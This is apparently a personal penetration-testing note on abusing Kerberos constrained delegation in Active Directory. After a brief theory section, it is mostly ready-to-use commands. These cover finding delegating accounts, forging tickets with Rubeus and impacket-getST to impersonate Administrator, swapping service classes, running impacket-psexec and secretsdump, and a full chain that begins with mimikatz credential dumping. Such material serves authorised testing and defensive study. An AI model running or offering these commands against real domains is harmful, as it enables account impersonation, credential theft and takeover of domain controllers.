---
tags:
  - Active_Directory
  - Advanced
  - Delegation_Abuse
  - Impacket
  - Kerberos
  - Lateral_Movement
  - Privilege_Escalation
  - Rubeus
  - Windows
---

## Constrained Delegation Theory
resources: [HackTricks - Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html)

> [!info] Constrained delegation limits which services account can delegate to. Uses **S4U** (Service for User) extensions.

> [!important] **Requirements:**
> - Control of delegating account (password or hash)
> - Target SPN in **msDS-AllowedToDelegateTo** attribute
> - Network access to target service

### S4U Extensions
> - **S4U2Self** - Service requests ticket to itself on behalf of user (impersonation)
> - **S4U2Proxy** - Service requests ticket to allowed service on behalf of user

### Constrained Delegation Flow
> [!tip] Attack sequence:
> 1. Service uses **S4U2Self** to get ticket impersonating target user
> 2. Service uses **S4U2Proxy** to get ticket to allowed service
> 3. Service accesses allowed service as impersonated user

## Find Constrained Delegation

### BloodHound Queries
```cypher
# Users
MATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate

# Computers
MATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate

# All
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate
```

### PowerView Enumeration [Remote]
```powershell
# Users
Get-DomainUser -TrustedToAuth

# Computers
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto
```

### Active Directory Module [Remote]
```powershell
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### LDAP Search [Local]
```bash
ldapsearch -x -H ldap://<DC-IP> -D "<User>@<Domain>" -w "<Password>" -b "DC=<Domain>,DC=<TLD>" "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

### NetExec Enumeration [Local]
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

### [Alternate] Find All Delegation Types
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation
```

## Exploiting Constrained Delegation

### Rubeus S4U Attack [Remote]
> [!important] Requires password/hash of account with constrained delegation.

```cmd
Rubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:<AllowedSPN> /ptt
```

#### With AES Key [alternative]
```cmd
Rubeus.exe s4u /user:<ServiceAccount> /aes256:<AESKey> /impersonateuser:Administrator /msdsspn:<AllowedSPN> /ptt
```

### Impacket getST [Local]
```bash
# With password
impacket-getST -spn <AllowedSPN> -impersonate Administrator -dc-ip <DC-IP> <Domain>/<ServiceAccount>:<Password>
```

```bash
# With hash
impacket-getST -spn <AllowedSPN> -impersonate Administrator -hashes :<NTHash> -dc-ip <DC-IP> <Domain>/<ServiceAccount>
```

```bash
# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <Target>
```

### Validate Access
```bash
nxc smb <Target> -u Administrator -k --use-kcache
```

```bash
impacket-secretsdump -k -no-pass <Target>
```

## Alternative Service Attack

> [!tip] Request ticket for different service on same host. SPN's service class is not validated.

```cmd
Rubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:http/<Target> /altservice:cifs /ptt
```

### Common SPN Alternatives
> - **cifs** - File share access
> - **http** - WinRM access
> - **host** - General host access
> - **ldap** - LDAP queries
> - **mssql** - SQL Server access

## Protocol Transition Attack

### When Protocol Transition Enabled
> [!info] If **TRUSTED_TO_AUTH_FOR_DELEGATION** flag set, can use S4U2Self without user authentication.

```cmd
Rubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:<SPN> /ptt
```

### When Protocol Transition Disabled
> [!warning] Need existing TGT/ticket from target user to use S4U2Proxy.

```cmd
# Get TGT for service account
Rubeus.exe asktgt /user:<ServiceAccount> /rc4:<NTHash>

# Use with S4U2Proxy only
Rubeus.exe s4u /ticket:<ServiceTGT> /impersonateuser:Administrator /msdsspn:<SPN> /ptt
```

## Full Attack Example
```text
1. Find constrained delegation: Get-DomainComputer -TrustedToAuth
2. Dump service account hash: mimikatz sekurlsa::logonpasswords
3. S4U attack: Rubeus.exe s4u /user:websvc /rc4:<Hash> /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt
4. Access target: dir \\dc01.domain.local\c$
```
